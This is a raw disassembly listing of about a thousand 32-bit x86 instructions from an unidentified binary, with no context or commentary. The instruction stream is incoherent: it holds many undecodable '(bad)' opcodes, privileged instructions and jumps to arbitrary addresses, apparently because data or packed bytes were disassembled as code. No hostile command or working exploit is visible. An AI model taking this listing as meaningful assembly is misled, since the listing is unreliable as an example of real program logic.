  40fc52:	mov    DWORD PTR [ebp-0x8],eax
  40fc55:	mov    eax,edi
  40fc57:	cld    
  40fc58:	lock pop eax
  40fc5a:	test   DWORD PTR [ebx],esi
  40fc5c:	clc    
  40fc5d:	add    edx,DWORD PTR [edi-0x740bff77]
  40fc63:	fdivp  st(4),st
  40fc65:	test   ecx,esi
  40fc67:	(bad)  
  40fc68:	jnp    0x40fc69
  40fc6a:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fc70:	jae    0x40fbfd
  40fc72:	sub    edi,esp
  40fc74:	(bad)  
  40fc75:	shl    DWORD PTR [eax-0x3e],0x89
  40fc79:	leave  
  40fc7a:	call   0x8196b387
  40fc7f:	in     al,dx
  40fc80:	(bad)  
  40fc81:	in     al,dx
  40fc82:	add    bh,al
  40fc84:	mov    esp,edi
  40fc86:	in     al,dx
  40fc87:	test   DWORD PTR [ebp-0x8],edi
  40fc8a:	mov    eax,DWORD PTR [ebp+0x2b]
  40fc8d:	xor    al,BYTE PTR [ebx]
  40fc8f:	pushf  
  40fc90:	jnp    0x572ff8c9
  40fc96:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  40fc9a:	loopne 0x40fccf
  40fc9c:	jne    0x40fc59
  40fc9e:	mov    esi,DWORD PTR [edx-0x20]
  40fca1:	add    BYTE PTR [ebp-0x3d],bh
  40fca4:	xor    eax,DWORD PTR [ebp-0x73]
  40fca7:	mov    edi,DWORD PTR [esi]
  40fca9:	cld    
  40fcaa:	jb     0x40fc72
  40fcac:	add    bl,al
  40fcae:	jne    0x40fcf5
  40fcb0:	mov    edx,DWORD PTR [edi-0x10]
  40fcb3:	jge    0x40fd32
  40fcb5:	mov    esi,DWORD PTR [ebx]
  40fcb7:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fcbb:	xor    esi,DWORD PTR [ebp-0x77]
  40fcbe:	mov    esi,eax
  40fcc0:	lock inc ebp
  40fcc2:	jge    0x40fcf5
  40fcc4:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fccb:	dec    ebp
  40fccc:	mov    esi,DWORD PTR [ebx]
  40fcce:	loopne 0x40fc59
  40fcd0:	jge    0x40fcca
  40fcd2:	add    DWORD PTR [ebp-0x7d],eax
  40fcd5:	icebp  
  40fcd6:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fcdd:	dec    ebp
  40fcde:	hlt    
  40fcdf:	xor    ebx,DWORD PTR [ebp-0x77]
  40fce2:	mov    esi,esp
  40fce4:	in     al,0x45
  40fce6:	jge    0x40fd25
  40fce8:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fcef:	dec    ebp
  40fcf0:	push   esp
  40fcf1:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  40fcf7:	inc    ebp
  40fcf8:	hlt    
  40fcf9:	xor    DWORD PTR [ebp-0x61],esi
  40fcfc:	mov    edi,DWORD PTR [eax+0xf19504]
  40fd02:	repnz mov DWORD PTR [ebp+0x20],ebx
  40fd06:	cmp    eax,DWORD PTR [ebp+0xf]
  40fd09:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fd0d:	fistp  WORD PTR [ebx+0x0]
  40fd10:	inc    ebp
  40fd11:	mov    ebx,DWORD PTR [edi+0xc]
  40fd14:	add    eax,eax
  40fd16:	inc    ebp
  40fd17:	test   BYTE PTR [ebx],dh
  40fd19:	add    eax,DWORD PTR [ebx]
  40fd1b:	add    BYTE PTR [esi+0x45],bl
  40fd1e:	ret    0x85
  40fd21:	jnp    0x544180f0
  40fd27:	inc    bp
  40fd29:	inc    ebp
  40fd2a:	xor    DWORD PTR [ecx+0xc78a9c],edi
  40fd30:	fdiv   QWORD PTR [ebx]
  40fd32:	test   DWORD PTR [ecx+0x453bf8],edi
  40fd38:	push   ebx
  40fd39:	add    edi,DWORD PTR [esi+0x708088b]
  40fd3f:	cmp    esi,eax
  40fd41:	setnp  BYTE PTR [ecx-0x74fcffce]
  40fd48:	mov    esp,edi
  40fd4a:	call   0x33cc429c
  40fd4f:	or     BYTE PTR [ebx],al
  40fd51:	inc    ecx
  40fd52:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40fd58:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fd5e:	lock add cl,al
  40fd61:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fd68:	mov    ch,0x45
  40fd6a:	clc    
  40fd6b:	xor    eax,DWORD PTR [ebp+0x3]
  40fd6e:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fd74:	inc    ebp
  40fd75:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fd7b:	mov    edi,eax
  40fd7d:	mov    eax,DWORD PTR [ebp+0x3c]
  40fd80:	mov    ecx,DWORD PTR [eax]
  40fd82:	hlt    
  40fd83:	inc    ebp
  40fd84:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40fd8b:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fd91:	push   ebp
  40fd92:	mov    edi,DWORD PTR [ebx]
  40fd94:	in     al,dx
  40fd95:	jne    0x40fd58
  40fd97:	mov    eax,DWORD PTR [ebp-0x28]
  40fd9a:	add    DWORD PTR [eax],0xe8058dec
  40fda0:	clc    
  40fda1:	mov    esi,DWORD PTR [edi-0x8]
  40fda4:	add    dh,dl
  40fda6:	rol    WORD PTR [ebp-0x1],cl
  40fdaa:	mov    edx,DWORD PTR [eax+0x8]
  40fdad:	jne    0x40fd6f
  40fdaf:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40fdb6:	inc    ebp
  40fdb7:	push   esp
  40fdb8:	test   DWORD PTR [ecx+0xf],ecx
  40fdbb:	sub    edx,esp
  40fdbd:	add    eax,DWORD PTR [eax]
  40fdbf:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40fdc5:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40fdcc:	mov    eax,DWORD PTR [ecx]
  40fdce:	and    BYTE PTR [eax],al
  40fdd0:	cmp    al,0x10
  40fdd2:	add    BYTE PTR [ebp+0x66],al
  40fdd5:	inc    ecx
  40fdd7:	push   esp
  40fdd8:	add    dh,BYTE PTR [ebp+0x0]
  40fddb:	push   edx
  40fddc:	enterw 0xc1,0x4d
  40fde1:	mov    esp,DWORD PTR [esi+0x20]
  40fde4:	add    DWORD PTR [ecx-0x7b],eax
  40fde7:	add    eax,DWORD PTR [ebx]
  40fde9:	str    WORD PTR [eax+0x45]
  40fded:	lea    ecx,[ebx+0x45890801]
  40fdf3:	sbb    BYTE PTR [ebx],al
  40fdf5:	dec    ebp
  40fdf6:	cmp    al,0xf
  40fdf8:	inc    ebp
  40fdf9:	push   eax
  40fdfa:	mov    esi,DWORD PTR [ebx]
  40fdfc:	push   eax
  40fdfd:	add    eax,eax
  40fdff:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40fe06:	inc    ebp
  40fe07:	add    BYTE PTR [ecx],dh
  40fe09:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  40fe10:	(bad)  
  40fe11:	mov    ebx,eax
  40fe13:	loopne 0x40fe5a
  40fe15:	dec    ebp
  40fe16:	mov    ecx,DWORD PTR [edi]
  40fe18:	cld    
  40fe19:	push   eax
  40fe1a:	xchg   DWORD PTR [ebx],esi
  40fe1c:	add    DWORD PTR [ebx],ebp
  40fe1e:	add    BYTE PTR [ebx],ch
  40fe20:	or     BYTE PTR [ecx],bh
  40fe22:	dec    ecx
  40fe23:	loopne 0x40fe28
  40fe25:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40fe2b:	push   ebp
  40fe2c:	add    DWORD PTR [ebx+0x55100800],eax
  40fe32:	dec    ebp
  40fe33:	jmp    0x40fdbe
  40fe35:	mov    esp,DWORD PTR [eax]
  40fe37:	sbb    dl,dl
  40fe39:	inc    eax
  40fe3a:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40fe40:	add    BYTE PTR [ebx+0x74528555],cl
  40fe46:	push   ebp
  40fe47:	div    DWORD PTR [ebx]
  40fe49:	and    eax,DWORD PTR [ebx]
  40fe4b:	add    edx,DWORD PTR [edx-0x30]
  40fe4e:	jno    0x40fddb
  40fe50:	inc    DWORD PTR [eax+eiz*1]
  40fe53:	inc    ebp
  40fe54:	push   eax
  40fe55:	push   eax
  40fe56:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40fe5c:	mov    edi,esp
  40fe5e:	push   eax
  40fe5f:	inc    ebp
  40fe60:	enter  0x458b,0x8
  40fe64:	push   ecx
  40fe65:	(bad)  
  40fe66:	call   0x10b083e
  40fe6b:	pop    ss
  40fe6c:	push   ebp
  40fe6d:	mov    ecx,DWORD PTR [ebx+0x489408]
  40fe73:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40fe79:	push   ecx
  40fe7a:	jo     0x40fe64
  40fe7c:	inc    DWORD PTR [edi]
  40fe7e:	or     BYTE PTR [eax],al
  40fe80:	call   0xcc05ca
  40fe85:	fmul   QWORD PTR [ebp+0x55]
  40fe88:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fe8e:	mov    bh,0x8c
  40fe90:	adc    al,0x9b
  40fe92:	dec    esp
  40fe93:	xor    bl,BYTE PTR [eax]
  40fe95:	mov    ecx,DWORD PTR [ebp+0xc]
  40fe98:	mov    eax,DWORD PTR [ebp-0x4]
  40fe9b:	mov    esi,DWORD PTR [edi-0x3148f924]
  40fea1:	push   es
  40fea2:	retf   
  40fea3:	mov    BYTE PTR [ebp-0x30],0x3b
  40fea7:	inc    ebp
  40fea8:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  40feaf:	retf   0x83fc
  40feb2:	into   
  40feb3:	dec    ebp
  40feb4:	retf   
  40feb5:	mov    ecx,DWORD PTR [ebp-0x74]
  40feb8:	mov    eax,DWORD PTR [eax]
  40feba:	fdiv   QWORD PTR [ebx]
  40febc:	mov    bh,0x3
  40febe:	push   es
  40febf:	mov    esi,ecx
  40fec1:	sbb    cl,dl
  40fec3:	dec    ebp
  40fec4:	sar    DWORD PTR [ebx],cl
  40fec6:	push   ebp
  40fec7:	jne    0x40fed8
  40fec9:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  40fecf:	lea    ebx,[eax]
  40fed1:	call   0xf4ca8a98
  40fed6:	sbb    dh,dl
  40fed8:	add    edx,ebx
  40feda:	push   ebp
  40fedb:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  40fee1:	push   ecx
  40fee2:	mov    DWORD PTR [eax-0x30],edx
  40fee5:	test   DWORD PTR [edx],eax
  40fee7:	xadd   esp,esi
  40feea:	pop    es
  40feeb:	add    cl,dl
  40feed:	mov    eax,ecx
  40feef:	or     al,0x45
  40fef1:	(bad)  
  40fef2:	push   eax
  40fef3:	add    DWORD PTR [edx+0x0],eax
  40fef6:	add    ecx,DWORD PTR [ecx]
  40fef8:	and    dh,cl
  40fefa:	call   0xc507ca
  40feff:	add    DWORD PTR [ebp+0x0],edx
  40ff02:	mov    esp,DWORD PTR [ebp+0x18]
  40ff05:	add    BYTE PTR [eax+0x50],cl
  40ff08:	xor    eax,DWORD PTR [eax]
  40ff0a:	add    esp,DWORD PTR [esi+0x3b]
  40ff0d:	inc    ebp
  40ff0e:	je     0x40fe93
  40ff10:	push   ecx
  40ff11:	dec    BYTE PTR [ebp-0x77]
  40ff14:	add    eax,esi
  40ff16:	or     al,0x5e
  40ff18:	inc    eax
  40ff19:	add    BYTE PTR [ebx],al
  40ff1b:	data16 and BYTE PTR [ebp+0x50],al
  40ff1f:	sub    DWORD PTR [ecx],0xfffffff8
  40ff22:	add    BYTE PTR [ebp-0x75],ah
  40ff25:	add    BYTE PTR [eax],bl
  40ff27:	enter  0x894d,0x8b
  40ff2b:	int3   
  40ff2c:	loopne 0x40fef0
  40ff2e:	rol    BYTE PTR [eax],0x33
  40ff31:	lea    cx,[ebp+0xa]
  40ff35:	data16 jb 0x40ff7d
  40ff38:	add    BYTE PTR [ebx+0x44890855],cl
  40ff3e:	sbb    ah,al
  40ff40:	inc    ebp
  40ff41:	cmp    al,0xf
  40ff43:	add    BYTE PTR [edx+0x66],dl
  40ff46:	xor    ecx,DWORD PTR [eax]
  40ff48:	sub    eax,DWORD PTR [edx]
  40ff4a:	mov    eax,DWORD PTR [eax]
  40ff4c:	or     al,0x66
  40ff4e:	ror    edx,cl
  40ff50:	dec    ebp
  40ff51:	inc    ebp
  40ff52:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  40ff58:	cld    
  40ff59:	or     BYTE PTR [edi+0x4501dd],dl
  40ff5f:	ret    0xecce
  40ff62:	retf   
  40ff63:	(bad)  
  40ff64:	dec    ebp
  40ff65:	mov    al,0x8b
  40ff67:	loopne 0x40ff89
  40ff69:	cmp    ecx,DWORD PTR [edx]
  40ff6b:	inc    ebp
  40ff6c:	daa    
  40ff6d:	loopne 0x40fef6
  40ff6f:	in     al,dx
  40ff70:	add    edi,eax
  40ff72:	add    BYTE PTR [eax+0x3f52e155],bh
  40ff78:	push   ebp
  40ff79:	inc    ebp
  40ff7a:	xor    ebx,edx
  40ff7c:	add    ebp,esp
  40ff7e:	push   edx
  40ff7f:	push   bp
  40ff81:	inc    ebp
  40ff82:	(bad)  
  40ff83:	in     eax,dx
  40ff84:	push   esp
  40ff85:	(bad)  
  40ff86:	inc    edx
  40ff88:	sbb    al,0x33
  40ff8a:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  40ff91:	add    BYTE PTR [ebp+0x46],0x8b
  40ff95:	jmp    0xf98b:0x100041c8
  40ff9c:	xor    esi,DWORD PTR [edx+0x3]
  40ff9f:	mov    ecx,DWORD PTR [edi]
  40ffa1:	fmul   DWORD PTR [edx]
  40ffa3:	add    BYTE PTR [eax],al
  40ffa5:	lea    eax,[ebx-0x4700273c]
  40ffab:	add    al,0x4f
  40ffad:	pop    DWORD PTR [eax]
  40ffaf:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  40ffb5:	push   edx
  40ffb6:	inc    WORD PTR [ebp+0x8]
  40ffba:	mov    eax,0x514f4d
  40ffbf:	(bad)
  40ffc3:	add    al,al
  40ffc5:	xor    DWORD PTR [ebx-0x74baf730],eax
  40ffcb:	test   DWORD PTR [esi+0x74],esp
  40ffce:	inc    ebp
  40ffcf:	mov    DWORD PTR [eax+0xa4e08],edi
  40ffd5:	add    BYTE PTR [ecx-0x76c435bb],cl
  40ffdb:	or     dh,cl
  40ffdd:	or     eax,0x8b8d5045
  40ffe2:	inc    ebp
  40ffe3:	mov    WORD PTR [ecx+0x3b8a00],?
  40ffe9:	jne    0x41001e
  40ffeb:	mov    edi,DWORD PTR [edx+0x8f3b18]
  40fff1:	add    DWORD PTR [ebx],eax
  40fff3:	add    bh,bh
  40fff5:	adc    DWORD PTR [eax],ecx
  40fff7:	adc    DWORD PTR [ebp+0x55],edi
  40fffa:	push   es
  40fffb:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410001:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  410008:	inc    ebp
  410009:	mov    esp,edi
  41000b:	or     al,0xda
  41000d:	push   eax
  41000e:	(bad)  
  41000f:	jne    0x40ffc5
  410011:	call   0x38f900
  410016:	inc    ebp
  410017:	sar    BYTE PTR [eax],0x84
  41001a:	in     al,dx
  41001b:	add    bh,al
  41001d:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  410024:	(bad)  
  410025:	and    al,al
  410027:	fs in  eax,dx
  410029:	inc    DWORD PTR [ebp-0x7b]
  41002c:	jle    0x41003d
  41002e:	leave  
  41002f:	scas   al,BYTE PTR es:[edi]
  410030:	inc    esp
  410031:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  410038:	or     BYTE PTR [ebx-0x97717c8],0x83
  41003f:	call   DWORD PTR [edi]
  410041:	shr    ah,0x84
  410044:	xchg   DWORD PTR [eax],eax
  410046:	add    DWORD PTR [eax],eax
  410048:	add    bh,bh
  41004a:	dec    ebp
  41004b:	and    BYTE PTR [ecx-0x38],dl
  41004e:	push   eax
  41004f:	dec    DWORD PTR [ebx+0xfd885]
  410055:	mov    BYTE PTR [ebp+0x508bac00],cl
  41005b:	mov    WORD PTR [ecx+0x0],ss
  41005e:	lea    ecx,[ebx+0x108b20d8]
  410064:	mov    WORD PTR [edx],ds
  410066:	add    BYTE PTR [edi+0xff01ff],al
  41006c:	mov    ecx,DWORD PTR [ebp-0x28]
  41006f:	push   ecx
  410070:	shl    BYTE PTR [ebp+0x3a],0x8b
  410074:	inc    ebp
  410075:	in     al,0xeb
  410077:	jno    0x410004
  410079:	push   edx
  41007a:	mov    DWORD PTR [eax-0x28],edx
  41007d:	mov    eax,DWORD PTR [ebp+0x20]
  410080:	je     0x410009
  410082:	mov    eax,DWORD PTR [ecx]
  410084:	sbb    BYTE PTR [eax],al
  410086:	pop    DWORD PTR [eax]
  410088:	add    esi,eax
  41008a:	add    bl,al
  41008c:	adc    DWORD PTR [edi],esi
  41008e:	jmp    0x8bcc50e0
  410093:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  41009a:	jne    0x410027
  41009c:	mov    ecx,DWORD PTR [eax]
  41009e:	in     al,0x75
  4100a0:	pop    DWORD PTR [ecx+0x5401]
  4100a6:	push   edx
  4100a7:	inc    DWORD PTR [ebx]
  4100a9:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4100af:	add    BYTE PTR [edi+0x9],dl
  4100b2:	call   DWORD PTR [esi]
  4100b4:	and    dl,al
  4100b6:	and    bh,bh
  4100b8:	inc    edi
  4100ba:	test   eax,edx
  4100bc:	sldt   ebx
  4100bf:	xor    al,BYTE PTR [eax]
  4100c1:	pushf  
  4100c2:	(bad)  
  4100c3:	jmp    0x4100d1
  4100c5:	mov    eax,edi
  4100c7:	or     al,0x75
  4100c9:	inc    eax
  4100ca:	call   0x40f7d2
  4100cf:	mov    eax,eax
  4100d1:	loopne 0x410057
  4100d3:	inc    ebp
  4100d4:	add    BYTE PTR [ebx+0x1451c00],cl
  4100da:	mov    eax,DWORD PTR [ebp+0x20]
  4100dd:	add    edi,ecx
  4100df:	add    BYTE PTR [eax],ch
  4100e1:	cmp    edi,0x18
  4100e4:	test   DWORD PTR [ebp+0xf],esi
  4100e7:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4100ee:	jne    0x4100f2
  4100f0:	call   0xff9ffbb5
  4100f5:	leave  
  4100f6:	rcr    BYTE PTR [esp+eax*4],0x55
  4100fa:	add    ah,ch
  4100fc:	add    BYTE PTR [edi-0x48fef979],dh
  410102:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  410109:	inc    esp
  41010a:	mov    ebx,DWORD PTR [eax]
  41010c:	fcom   st(2)
  41010e:	add    BYTE PTR [edi],bl
  410110:	lea    ecx,[eax-0x18]
  410113:	(bad)  
  410114:	push   DWORD PTR [ecx]
  410116:	call   0xffb34e78
  41011b:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  41011f:	fstp   DWORD PTR [esi+ebx*8]
  410122:	push   ebp
  410123:	pop    ebp
  410124:	mov    esi,DWORD PTR [edx-0x38]
  410127:	add    DWORD PTR [eax],0x28
  41012a:	mov    edi,DWORD PTR [ebx]
  41012c:	xor    esi,DWORD PTR [edx+0x3]
  41012f:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410133:	pop    ebp
  410134:	or     al,0x4
  410136:	inc    ecx
  410137:	push   ebp
  410138:	(bad)  
  410139:	in     al,dx
  41013a:	or     ah,ch
  41013c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013d:	xbegin 0xffc67733
  410143:	clc    
  410144:	adc    al,0x45
  410146:	div    BYTE PTR [edx]
  410148:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  41014f:	test   DWORD PTR [ebx+0x666300f8],ebx
  410155:	add    BYTE PTR [ecx+0x66],dh
  410158:	add    eax,DWORD PTR [ebp+0x52]
  41015b:	adc    eax,0xffffffa0
  41015e:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  410164:	test   DWORD PTR [eax],eax
  410166:	clc    
  410167:	data16 or al,BYTE PTR [ebp+0x45]
  41016b:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  410172:	rol    BYTE PTR [ebp+0x45],1
  410175:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  41017b:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  410181:	push   ebx
  410182:	add    BYTE PTR [eax+eax*1+0x51],dl
  410186:	jge    0x4101bb
  410188:	add    BYTE PTR [esi+0x4],dl
  41018b:	jne    0x4101f2
  41018d:	mov    edx,0x457200
  410192:	jmp    0x410156
  410194:	xor    edi,DWORD PTR [ebx]
  410196:	pop    edi
  410197:	cvtdq2ps xmm7,xmm0
  41019a:	ret    0x0
  41019d:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4101a3:	xor    ecx,DWORD PTR [edi]
  4101a5:	add    eax,DWORD PTR [ecx+0x3b]
  4101a8:	push   ebx
  4101a9:	rdpmc  
  4101ab:	out    0x8d,al
  4101ad:	add    BYTE PTR [eax],cl
  4101af:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4101b5:	ret    0x450c
  4101b8:	sbb    al,0x8b
  4101ba:	cmp    eax,esi
  4101bc:	or     cl,al
  4101be:	or     al,0xc2
  4101c0:	pop    eax
  4101c1:	inc    ebp
  4101c2:	add    ecx,DWORD PTR [edi]
  4101c4:	add    esi,DWORD PTR [ebp+0x39]
  4101c7:	invd   
  4101c9:	jge    0x4101d5
  4101cb:	mov    eax,0x478ac0
  4101d0:	cli    
  4101d1:	xor    esp,ecx
  4101d3:	mov    ebx,0x5b8ac0
  4101d8:	ret    0x33
  4101db:	mov    eax,0x833b8b
  4101e0:	sub    BYTE PTR [ebx],al
  4101e2:	inc    ebp
  4101e3:	xor    ax,di
  4101e6:	pushf  
  4101e7:	inc    bh
  4101e9:	mov    esp,esp
  4101eb:	hlt    
  4101ec:	test   DWORD PTR [ebp-0x8],esi
  4101ef:	mov    eax,DWORD PTR [ebp-0x14]
  4101f2:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4101f8:	dec    edi
  4101f9:	or     BYTE PTR [eax],al
  4101fb:	jne    0x410186
  4101fd:	mov    esi,esp
  4101ff:	call   0x77a78dc4
  410204:	inc    ebp
  410205:	mov    DWORD PTR [eax+0x9b4f0c],edi
  41020b:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410211:	add    BYTE PTR [esi+0x7d],ah
  410214:	inc    ebp
  410215:	mov    bx,WORD PTR [ebp+0x8]
  410219:	add    DWORD PTR [ebp+0x54],0x30c008b
  410220:	inc    ebp
  410221:	mov    bx,di
  410224:	lock test BYTE PTR [ecx+0x7000801],bh
  41022b:	jge    0x4101ee
  41022d:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  410233:	cli    
  410234:	xor    bl,bh
  410236:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41023c:	test   BYTE PTR [eax],cl
  41023e:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  410245:	cmp    ebp,eax
  410247:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  41024e:	test   BYTE PTR [ebp+0x1],bh
  410251:	mov    ebx,0x458a00
  410256:	xor    esi,DWORD PTR [ebx]
  410258:	add    esp,DWORD PTR [esi-0x77]
  41025b:	pop    ebp
  41025c:	loopne 0x4102c4
  41025e:	inc    ebp
  41025f:	clc    
  410260:	xor    edi,DWORD PTR [ebx]
  410262:	add    esi,DWORD PTR [edx-0x77]
  410265:	data16 fdivr QWORD PTR [ebp-0x49]
  410269:	mov    ebx,0xb78afc
  41026e:	hlt    
  41026f:	xor    edi,DWORD PTR [esi+eiz*2]
  410272:	add    BYTE PTR [ebp+0x66],bl
  410275:	data16 lock clc 
  410278:	cmp    al,0x3b
  41027a:	add    BYTE PTR [edi+0x66],dh
  41027d:	psubq  mm7,QWORD PTR [ebp+0x2]
  410281:	ltr    WORD PTR [ebp+0x66]
  410285:	add    esi,eax
  410287:	add    di,WORD PTR [ebp+0x2b]
  41028b:	data16 data16 jge 0x41030c
  41028f:	mov    ebx,0xe08a8b
  410294:	jge    0x4102c9
  410296:	data16 data16 xor al,0x5d
  41029a:	data16 data16 jne 0x410296
  41029e:	mov    edi,DWORD PTR [ebx]
  4102a0:	fdiv   QWORD PTR [edx+0x7d]
  4102a3:	data16 data16 jge 0x4102db
  4102a7:	mov    ebx,0x758a66
  4102ac:	mov    esi,0x667233
  4102b1:	pop    ebp
  4102b2:	or     BYTE PTR [esi+0x0],ah
  4102b5:	clc    
  4102b6:	mov    edi,DWORD PTR [ebx]
  4102b8:	lock ja 0x410246
  4102bb:	(bad)  
  4102bd:	jge    0x4102b6
  4102bf:	invd   
  4102c1:	pop    ebp
  4102c2:	add    BYTE PTR [ebx],al
  4102c4:	(bad)  
  4102c5:	cmp    di,WORD PTR [ebp+0xf]
  4102c9:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4102cd:	mov    bx,WORD PTR [ebp-0x10]
  4102d1:	pop    bp
  4102d3:	fbstp  TBYTE PTR [ebx]
  4102d5:	test   DWORD PTR [ebx],eax
  4102d7:	add    BYTE PTR [ebx],bh
  4102d9:	add    BYTE PTR [esi+0x7d],ah
  4102dc:	jge    0x410269
  4102de:	data16 in al,dx
  4102e0:	pop    ebp
  4102e1:	stc    
  4102e2:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4102e9:	mov    edi,ebx
  4102eb:	in     al,dx
  4102ec:	test   BYTE PTR [ebp+0x0],bh
  4102ef:	mov    eax,DWORD PTR [eax]
  4102f1:	call   0xbd3dfc81
  4102f6:	cmp    al,0x9b
  4102f8:	add    BYTE PTR [edx],dh
  4102fa:	mov    bx,di
  4102fd:	call   0x8b49808d
  410302:	add    ebp,esp
  410304:	mov    bx,di
  410307:	jnp    0x41032f
  410309:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  41030f:	mov    eax,DWORD PTR [eax]
  410311:	call   0x7c3c8e7c
  410316:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41031c:	data16 data16 fistp WORD PTR [ebp+0xe]
  410321:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  41032b:	fisttp WORD PTR [ecx-0x7401f77b]
  410331:	(bad)  
  410332:	cld    
  410333:	jne    0x410371
  410335:	xor    eax,DWORD PTR [eax]
  410337:	mov    esp,DWORD PTR [esi-0x10]
  41033a:	sti    
  41033b:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  410342:	data16 adc bl,bh
  410345:	push   ebp
  410346:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  41034d:	mov    WORD PTR [eax],es
  41034f:	fwait
  410350:	data16 xor bh,bl
  410353:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  410359:	mov    esp,DWORD PTR [esi-0x14]
  41035c:	fisttp WORD PTR [ebx-0x3748a9f2]
  410362:	or     al,0x2b
  410364:	mov    bh,0xba
  410366:	hlt    
  410367:	mov    bh,bl
  410369:	add    BYTE PTR [ecx-0x7446f3cd],cl
  41036f:	dec    esi
  410370:	or     al,0x0
  410372:	mov    edi,DWORD PTR [ebx]
  410374:	or     BYTE PTR [ebp+0x3b],dh
  410377:	mov    ecx,DWORD PTR [edi]
  410379:	fdivr  QWORD PTR [ebx-0x7499ff83]
  41037f:	xor    al,0xd8
  410381:	pop    bp
  410383:	lock xor esi,DWORD PTR [ebx]
  410386:	lea    esp,[esi+0x1f]
  410389:	icebp  
  41038a:	jb     0x410390
  41038c:	add    al,al
  41038e:	jge    0x41039c
  410390:	mov    eax,eax
  410392:	fsubr  st,st(3)
  410394:	pop    ebp
  410395:	mov    esi,DWORD PTR [ebx]
  410397:	in     al,0x8d
  410399:	rcr    DWORD PTR [edi],0xc2
  41039c:	jb     0x4103fc
  41039e:	add    cl,cl
  4103a0:	jge    0x4103ae
  4103a2:	mov    edx,DWORD PTR [ebp-0x20]
  4103a5:	in     al,dx
  4103a6:	pop    ebp
  4103a7:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4103ac:	cmp    di,WORD PTR [ebp+0x0]
  4103b0:	mov    ebp,DWORD PTR [ebx]
  4103b2:	fdivr  QWORD PTR [esi+0x668a5d]
  4103b8:	cmp    al,0x33
  4103ba:	mov    si,0x4e7d
  4103be:	mov    eax,DWORD PTR [eax]
  4103c0:	lock inc ebp
  4103c2:	mov    esi,DWORD PTR [eax]
  4103c4:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4103cb:	clc    
  4103cc:	(bad)  
  4103cd:	cmp    edi,DWORD PTR [ebx]
  4103cf:	je     0x4103e0
  4103d1:	push   ebx
  4103d2:	loopne 0x4103e3
  4103d4:	dec    ecx
  4103d6:	mov    esp,DWORD PTR [ebp-0x1c]
  4103d9:	int    0xf1
  4103db:	mov    esi,0x703084d
  4103e0:	pcmpgtd mm6,mm1
  4103e3:	add    BYTE PTR [ebp+0x66],dh
  4103e6:	jmp    0x4103b3
  4103e8:	mov    eax,DWORD PTR [ebx]
  4103ea:	lock push ebp
  4103ec:	ror    DWORD PTR [ebp-0x2972feb3],1
  4103f2:	or     bh,dl
  4103f4:	jb     0x4103f4
  4103f6:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4103fc:	loopne 0x4103fe
  4103fe:	jne    0x410402
  410400:	data16 add BYTE PTR [esi+eiz*2],dh
  410404:	mov    ecx,ebx
  410406:	data16 cmp al,0xf1
  410409:	add    BYTE PTR [esi+eiz*2],bh
  41040c:	add    bl,cl
  41040e:	retw   0xf2
  410412:	ret    0x66
  410415:	retf   
  410416:	enterw 0x4df1,0x19
